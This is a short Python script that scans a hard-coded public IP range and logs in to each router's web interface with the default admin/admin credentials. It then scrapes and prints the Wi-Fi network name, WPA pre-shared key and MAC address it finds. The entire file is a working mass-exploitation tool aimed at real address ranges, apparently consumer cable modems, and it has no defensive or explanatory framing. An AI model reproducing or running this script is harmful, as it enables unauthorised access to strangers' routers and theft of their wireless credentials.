import requests as rq
from netaddr import *
from bs4 import BeautifulSoup as bs
from requests.auth import HTTPBasicAuth
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

user = "admin"
password = "admin"
#ip = "http://181.55.198.76/goform/login"
data = {
    "loginUsername":user, #username
    "loginPassword":password
}
headers = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding":"gzip, deflate, sdch",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"

    
}

s = rq.Session()
        
for url in IPNetwork("190.84.214.192/22"):
    ip = "http://"+str(url)
    print "probando %s"%(ip)
    try:
        
        r = s.post(ip+"/goform/login",data=data, timeout=0.5, verify=False)
        r = s.get(ip+"/wlanBasicSecurity.asp")
        html = bs(r.content, "html.parser")
        for ssid in html.findAll("input",{"name":"ServiceSetIdentifier"}):
            ssid = ssid["value"]
            for pwd in html.findAll("input",{"name":"BWpaPreSharedKey"}):
                pwd = pwd["value"]
                for mac in html.find("tr").findNext("td"):
                    mac = mac.split("(")
                    print mac[1][0:-1]
                    print ssid
                    print pwd
    except:
        pass
    
    
    
    
    
    
    